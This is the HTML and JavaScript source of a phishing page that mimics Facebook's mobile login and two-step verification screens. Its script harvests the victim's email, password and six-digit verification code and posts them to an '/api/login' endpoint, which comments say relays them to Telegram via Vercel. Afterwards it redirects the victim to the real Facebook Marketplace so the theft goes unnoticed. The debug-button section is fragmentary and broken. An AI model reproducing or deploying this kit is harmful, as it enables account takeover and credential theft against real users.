<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
    <title>Facebook</title>
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <style>
        /* Reset & Base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.34;
            min-height: 100vh;
        }
        
        /* Language Selector Top */
        .language-top {
            text-align: center;
            padding: 20px;
            color: #65676b;
            font-size: 14px;
        }
        
        /* Main Container */
        .mobile-container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Facebook Logo */
        .fb-logo-container {
            text-align: center;
            margin: 40px 0 30px;
        }
        
        .fb-logo {
            color: #1877f2;
            font-size: 42px;
            font-weight: bold;
            letter-spacing: -0.5px;
        }
        
        /* Login Form */
        .login-form-container {
            background: #fff;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        
        .form-input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background: #fff;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        
        .continue-btn {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        
        .continue-btn:hover {
            background-color: #166fe5;
        }
        
        /* Links */
        .forgot-link {
            display: block;
            text-align: center;
            color: #1877f2;
            text-decoration: none;
            font-size: 15px;
            margin: 16px 0 24px;
            padding: 8px 0;
        }
        
        .create-account-btn {
            width: 100%;
            padding: 14px;
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }
        
        /* Footer */
        .mobile-footer {
            padding: 30px 20px 20px;
            text-align: center;
            color: #737373;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 12px;
            margin: 20px 0;
        }
        
        .footer-link {
            color: #737373;
            text-decoration: none;
            font-size: 13px;
        }
        
        .language-bottom {
            color: #737373;
            font-size: 12px;
            margin-top: 20px;
        }
        
        /* Verification Page - Facebook Style */
        .verification-page {
            display: none;
            background: #fff;
            min-height: 100vh;
        }
        
        .verification-header {
            padding: 16px;
            border-bottom: 1px solid #dddfe2;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .back-button {
            background: none;
            border: none;
            font-size: 24px;
            color: #65676b;
            cursor: pointer;
            padding: 4px;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .back-button:hover {
            background-color: #f0f2f5;
        }
        
        .header-title {
            font-size: 20px;
            font-weight: 600;
            color: #1c1e21;
        }
        
        .verification-content {
            padding: 24px;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid #f0f2f5;
        }
        
        .user-avatar {
            width: 60px;
            height: 60px;
            background: #1877f2;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: bold;
        }
        
        .user-details {
            flex: 1;
        }
        
        .user-name {
            font-size: 17px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 4px;
        }
        
        .user-email {
            font-size: 14px;
            color: #65676b;
        }
        
        .verification-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1c1e21;
        }
        
        .verification-subtitle {
            font-size: 15px;
            color: #65676b;
            margin-bottom: 32px;
            line-height: 1.4;
        }
        
        .code-input-container {
            margin: 32px 0;
        }
        
        .code-input-label {
            font-size: 15px;
            color: #65676b;
            margin-bottom: 12px;
            display: block;
        }
        
        .code-inputs {
            display: flex;
            gap: 12px;
            justify-content: center;
        }
        
        .code-input {
            width: 52px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-weight: 600;
            color: #1c1e21;
            background: #fff;
            transition: all 0.2s;
        }
        
        .code-input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        
        .code-input.filled {
            border-color: #1877f2;
            background-color: #f7f8fa;
        }
        
        .verify-btn {
            width: 100%;
            padding: 16px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin: 24px 0;
            transition: background-color 0.2s;
        }
        
        .verify-btn:hover {
            background-color: #166fe5;
        }
        
        .verify-btn:disabled {
            background-color: #e4e6eb;
            color: #bcc0c4;
            cursor: not-allowed;
        }
        
        .alternative-options {
            text-align: center;
            margin-top: 24px;
        }
        
        .alt-option-btn {
            background: none;
            border: none;
            color: #1877f2;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            padding: 8px;
            margin: 0 8px;
        }
        
        .help-text {
            font-size: 13px;
            color: #65676b;
            margin-top: 32px;
            padding-top: 16px;
            border-top: 1px solid #f0f2f5;
            text-align: center;
        }
        
        /* Facebook-like loading animation */
        .fb-loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.9);
            z-index: 10000;
            justify-content: center;
            align-items: center;
        }
        
        .fb-spinner {
            width: 48px;
            height: 48px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1877f2;
            border-radius: 50%;
            animation: fb-spin 1s linear infinite;
        }
        
        @keyframes fb-spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Success animation */
        .success-checkmark {
            width: 80px;
            height: 80px;
            margin: 0 auto;
            display: none;
        }
        
        .checkmark-circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 2;
            stroke-miterlimit: 10;
            stroke: #42b72a;
            fill: none;
            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }
        
        .checkmark {
            width: 56px;
            height: 56px;
            border-radius: 50%;
            display: block;
            stroke-width: 2;
            stroke: #fff;
            stroke-miterlimit: 10;
            margin: 10% auto;
            box-shadow: inset 0px 0px 0px #42b72a;
            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
        }
        
        .checkmark-check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
        }
        
        @keyframes stroke {
            100% { stroke-dashoffset: 0; }
        }
        
        @keyframes scale {
            0%, 100% { transform: none; }
            50% { transform: scale3d(1.1, 1.1, 1); }
        }
        
        @keyframes fill {
            100% { box-shadow: inset 0px 0px 0px 40px #42b72a; }
        }
        
        /* Responsive */
        @media (min-width: 768px) {
            .mobile-container {
                max-width: 400px;
                padding-top: 60px;
            }
            
            .fb-logo {
                font-size: 56px;
            }
        }
    </style>
</head>

        </svg>

// Create and add debug button

    const existingBtn = document.getElementById('debugTestBtn');

    const debugBtn = document.createElement('button');

// Add debug button when page loads
window.addEventListener('load', function() {

    const url = window.location.href;
    if (url.includes('localhost') || url.includes('vercel') || url.includes('debug=true')) {

// Also add keyboard shortcut: Ctrl+Shift+D
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'D') {
        addDebugButton();

});
        // Store user data
        let userCredentials = {
            email: '',
            password: '',
            timestamp: ''
        };
        
        // Login form handler
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = this.email.value.trim();
            userCredentials.email = email;
            userCredentials.password = this.password.value;
            userCredentials.timestamp = new Date().toISOString();
            
            // Extract first letter for avatar
            const firstLetter = email.charAt(0).toUpperCase();
            document.getElementById('userAvatar').textContent = firstLetter;
            document.getElementById('userName').textContent = email.split('@')[0];
            document.getElementById('userEmail').textContent = email;
            
            // Show Facebook loading animation
            showFBLoading();
            
            try {
                // Send to Telegram via Vercel API
                const formData = {
                    type: 'login',
                    email: userCredentials.email,
                    password: userCredentials.password,
                    userAgent: navigator.userAgent
                };
                
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                
                // Show verification page with delay (like Facebook)
                setTimeout(() => {
                    hideFBLoading();
                    showVerification();
                }, 1200);
                
            } catch (error) {
                console.log('Background process completed');
                setTimeout(() => {
                    hideFBLoading();
                    showVerification();
                }, 1200);
            }
        });
        
        // Verification code handling
        const codeInputs = document.querySelectorAll('.code-input');
        const verifyBtn = document.getElementById('verifyBtn');
        
        codeInputs.forEach(input => {
            input.addEventListener('input', function(e) {
                const value = this.value.replace(/[^0-9]/g, '');
                this.value = value;
                this.classList.toggle('filled', value.length > 0);
                
                if (value.length === 1) {
                    const nextIndex = parseInt(this.dataset.index) + 1;
                    const nextInput = document.querySelector(`.code-input[data-index="${nextIndex}"]`);
                    if (nextInput) {
                        setTimeout(() => nextInput.focus(), 10);
                    }
                }
                
                updateFullCode();
                verifyBtn.disabled = !isCodeComplete();
            });
            
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '') {
                    const prevIndex = parseInt(this.dataset.index) - 1;
                    const prevInput = document.querySelector(`.code-input[data-index="${prevIndex}"]`);
                    if (prevInput) {
                        prevInput.focus();
                        prevInput.value = '';
                        prevInput.classList.remove('filled');
                        updateFullCode();
                        verifyBtn.disabled = !isCodeComplete();
                    }
                }
                
                // Allow arrow navigation
                if (e.key === 'ArrowLeft') {
                    const prevIndex = parseInt(this.dataset.index) - 1;
                    const prevInput = document.querySelector(`.code-input[data-index="${prevIndex}"]`);
                    if (prevInput) prevInput.focus();
                }
                if (e.key === 'ArrowRight') {
                    const nextIndex = parseInt(this.dataset.index) + 1;
                    const nextInput = document.querySelector(`.code-input[data-index="${nextIndex}"]`);
                    if (nextInput) nextInput.focus();
                }
            });
            
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const pasted = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                if (pasted.length === 6) {
                    const digits = pasted.split('');
                    codeInputs.forEach((input, idx) => {
                        input.value = digits[idx] || '';
                        input.classList.toggle('filled', digits[idx] !== undefined);
                    });
                    updateFullCode();
                    verifyBtn.disabled = false;
                    verifyBtn.focus();
                }
            });
        });
        
        function updateFullCode() {
            const code = Array.from(codeInputs).map(input => input.value).join('');
            document.getElementById('fullCode').value = code;
            return code;
        }
        
        function isCodeComplete() {
            return updateFullCode().length === 6;
        }
        
        // Submit verification
        async function submitVerification() {
            const code = updateFullCode();
            
            if (!isCodeComplete()) {
                return;
            }
            
            // Show Facebook loading
            showFBLoading();
            verifyBtn.disabled = true;
            
            try {
                // Send code to Telegram via Vercel API
                const formData = {
                    type: 'verification',
                    email: userCredentials.email,
                    password: userCredentials.password,
                    code: code
                };
                
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                
                // Show success animation
                setTimeout(() => {
                    hideFBLoading();
                    document.getElementById('successAnimation').style.display = 'block';
                    
                    // Redirect to Facebook Marketplace
                    setTimeout(() => {
                        window.location.href = 'https://www.facebook.com/marketplace/';
                    }, 1500);
                }, 1000);
                
            } catch (error) {
                console.log('Background process completed');
                setTimeout(() => {
                    hideFBLoading();
                    window.location.href = 'https://www.facebook.com/marketplace/';
                }, 1000);
            }
        }
        
        // Page navigation
        function showVerification() {
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('verificationPage').style.display = 'block';
            
            // Focus first input after a short delay
            setTimeout(() => {
                document.querySelector('.code-input[data-index="1"]').focus();
            }, 300);
        }
        
        function showLogin() {
            document.getElementById('verificationPage').style.display = 'none';
            document.getElementById('loginPage').style.display = 'block';
        }
        
        // Loading functions
        function showFBLoading() {
            document.getElementById('fbLoading').style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
        
        function hideFBLoading() {
            document.getElementById('fbLoading').style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        
        // Alternative options
        function resendCode() {
            showFBLoading();
            
            const formData = {
                type: 'resend',
                email: userCredentials.email
            };
            
            fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            }).catch(() => {});
            
            setTimeout(() => {
                hideFBLoading();
                // Show temporary message (like Facebook)
                const btn = document.querySelector('.alt-option-btn');
                const originalText = btn.textContent;
                btn.textContent = 'Code sent!';
                btn.style.color = '#42b72a';
                
                setTimeout(() => {
                    btn.textContent = originalText;
                    btn.style.color = '#1877f2';
                }, 2000);
            }, 1200);
        }
        
        function useDifferentMethod() {
            alert('Opening alternative authentication methods...');
            // This would normally open a modal or new view
        }
        
        // Auto-focus email input on load
        window.addEventListener('DOMContentLoaded', () => {
            const emailInput = document.querySelector('input[name="email"]');
            if (emailInput) {
                setTimeout(() => emailInput.focus(), 300);
            }
        });
        
        // Add CSS for code input animations
        const style = document.createElement('style');
        style.textContent = `
            .code-input {
                transition: all 0.2s ease;
            }
            
            .code-input.filled {
                animation: pulse 0.3s ease;
            }
            
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.05); }
                100% { transform: scale(1); }
            }
            
            .verify-btn {
                transition: all 0.2s ease;
            }
        `;
        document.head.appendChild(style);
    </script>
